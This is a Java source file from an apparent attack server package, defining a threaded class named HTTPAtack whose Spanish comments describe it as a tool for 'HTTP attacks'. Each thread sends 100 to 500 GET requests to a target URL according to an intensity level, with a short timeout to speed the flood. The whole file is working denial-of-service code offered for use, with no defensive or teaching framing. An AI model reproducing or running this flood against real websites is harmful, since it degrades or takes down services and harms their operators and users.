package br.com.pricher.server;

import java.net.HttpURLConnection;
import java.net.URL;

/*
 *  Clase que se encarga de realizar ataques HTTP. Esta clase abre N conexiones
 *  HTTP con la URL seleccionada (si esta es valida). Se ha reducido el tiempo
 *  de TimeOut para pasar a la siguiente llamada HTTP.
 *
 *  Esta clase extiende de Thread para crear hilos atacantes y asi hacer mas
 *  eficientes los ataques.
 */
class HTTPAtack extends Thread {

    // Intensidad
    private static final int LOW = 1;
    private static final int MEDIUM = 2;
    private static final int HIGH = 3;

    // Numero de peticiones segun la intensidad
    private static final int REQUEST_LOW = 100;
    private static final int REQUEST_MEDIUM = 200;
    private static final int REQUEST_HIGH = 500;

    // URL a a atacar
    private URL url;
    // Intensidad del ataque
    private int intensity;

    // Iniciamos la clase
    HTTPAtack(String url, int intensity) {
        try {
            this.url = new URL(url);
            this.intensity = intensity;
        } catch (Exception e) {
            System.out.println(e);
        }
    }

    /*
   * Devuelve el numero de peticiones en funcion de la intensidad
   */
    private static int getNumRequest(int intensity) {
        switch (intensity) {
            case LOW:
                return REQUEST_LOW;
            case MEDIUM:
                return REQUEST_MEDIUM;
            default:
                return REQUEST_HIGH;
        }
    }

    // Comienza el hilo. Este realiza 100 peticiones HTTP y va mostrando el
    // tiempo de respuesta de cada peticion
    public void run() {
        int i = 0;
        int request = getNumRequest(this.intensity);
        // Comenzamos las peticiones
        while (i < request) {
            try {
                // Realizamos la conexion
                HttpURLConnection conn = (HttpURLConnection) this.url.openConnection();
                conn.setAllowUserInteraction(true);
                conn.setConnectTimeout(5000); // 15 sec. connection timeout
                conn.setDoInput(true);
                conn.setDoOutput(false);
                conn.setUseCaches(false);
                conn.setRequestMethod("GET");
                conn.setRequestProperty("Content-type", "text/html; charset=" + "UTF-8");

                conn.connect();
                // Obtenemos los datos, si no la peticion GET no se llega a realizar.
                // Si no ejecutamos getResponse, solo abririamos la conexion TCP.
                conn.getResponseCode();
            } catch (Exception e) {
                System.out.println(e);
            }
            i++;
        }
    }
}
